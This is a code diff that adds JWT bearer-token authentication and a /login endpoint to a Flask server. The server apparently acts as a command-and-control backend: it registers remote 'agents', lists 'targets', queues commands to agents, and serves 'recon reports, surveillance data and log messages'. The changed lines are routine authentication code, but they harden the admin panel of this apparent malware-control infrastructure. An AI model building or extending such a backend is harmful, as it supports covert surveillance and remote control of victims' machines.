@@ -7,6 +7,7 @@ import os
 import json
 import hmac
 import hashlib
+import jwt
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.hazmat.primitives.serialization import load_pem_public_key
@@ -38,12 +39,14 @@ except Exception:
 
 CONFIG = {}
 ALLOWED_HOSTS = []
+JWT_SECRET = None
 if os.path.exists('config.json'):
     with open('config.json', 'r') as f:
         try:
             CONFIG = json.load(f)
             ALLOWED_HOSTS = CONFIG.get('allowed_hosts', [])
             API_KEYS = CONFIG.get('api_keys', {})
+            JWT_SECRET = CONFIG.get('jwt_secret')
         except Exception as e:
             logging.warning('Failed to load config.json: %s', e)
 
@@ -53,6 +56,21 @@ def require_api_key(f):
     def wrapper(*args, **kwargs):
         key = request.headers.get('X-API-KEY')
         if not key or key not in API_KEYS.values():
+            abort(401)
+        return f(*args, **kwargs)
+    return wrapper
+
+def require_token(f):
+    @wraps(f)
+    def wrapper(*args, **kwargs):
+        auth = request.headers.get('Authorization', '')
+        if not auth.startswith('Bearer '):
+            abort(401)
+        token = auth.split(' ', 1)[1]
+        try:
+            data = jwt.decode(token, JWT_SECRET, algorithms=['HS256'])
+            request.token_data = data
+        except Exception:
             abort(401)
         return f(*args, **kwargs)
     return wrapper
@@ -68,7 +86,7 @@ NONCE_WINDOW = 50
 
 @app.before_request
 def verify_request():
-    if request.path in ('/key_exchange',) or request.path.startswith('/admin') or request.path.startswith('/config'):
+    if request.path in ('/key_exchange', '/login') or request.path.startswith('/admin') or request.path.startswith('/config'):
         return
     uuid = None
     if request.view_args:
@@ -185,6 +203,24 @@ def register_client(uuid):
     db.session.commit()
     log_event(client, 'register')
     return client
+
+
+@app.route('/login', methods=['POST'])
+def login():
+    data = request.get_json(force=True)
+    key = data.get('api_key')
+    for kid, value in API_KEYS.items():
+        if key == value:
+            token = jwt.encode(
+                {
+                    'kid': kid,
+                    'exp': datetime.utcnow() + timedelta(hours=1),
+                },
+                JWT_SECRET,
+                algorithm='HS256',
+            )
+            return jsonify({'token': token})
+    return jsonify({'error': 'unauthorized'}), 401
 
 @app.route('/register', methods=['POST'])
 def register():
@@ -353,7 +389,7 @@ def list_targets():
 
 
 @app.route('/admin/config', methods=['GET'])
-@require_api_key
+@require_token
 def admin_config():
     return jsonify({
         'api_keys': list(API_KEYS.keys()),
@@ -368,7 +404,7 @@ def admin_config():
 
 
 @app.route('/admin/agents', methods=['GET'])
-@require_api_key
+@require_token
 def list_agents():
     check_timeouts()
     clients = Client.query.all()
@@ -383,7 +419,7 @@ def list_agents():
 
 
 @app.route('/admin/logs/<uuid>', methods=['GET'])
-@require_api_key
+@require_token
 def agent_logs(uuid):
     """Return recon reports, surveillance data and log messages for an agent."""
     client = Client.query.filter_by(uuid=uuid).first()
@@ -419,13 +455,13 @@ def agent_logs(uuid):
 
 
 @app.route('/admin/command/<uuid>', methods=['POST'])
-@require_api_key
+@require_token
 def admin_command(uuid):
     return add_command(uuid)
 
 
 @app.route('/admin/templates', methods=['GET'])
-@require_api_key
+@require_token
 def list_templates():
     entries = Template.query.all()
     result = []
@@ -441,7 +477,7 @@ def list_templates():
 
 
 @app.route('/admin/templates', methods=['POST'])
-@require_api_key
+@require_token
 def create_template():
     data = request.get_json(force=True)
     name = data.get('name')
@@ -464,7 +500,7 @@ def create_template():
 
 
 @app.route('/admin/templates/<tid>', methods=['DELETE'])
-@require_api_key
+@require_token
 def delete_template(tid):
     entry = Template.query.filter_by(template_id=tid).first()
     if not entry:
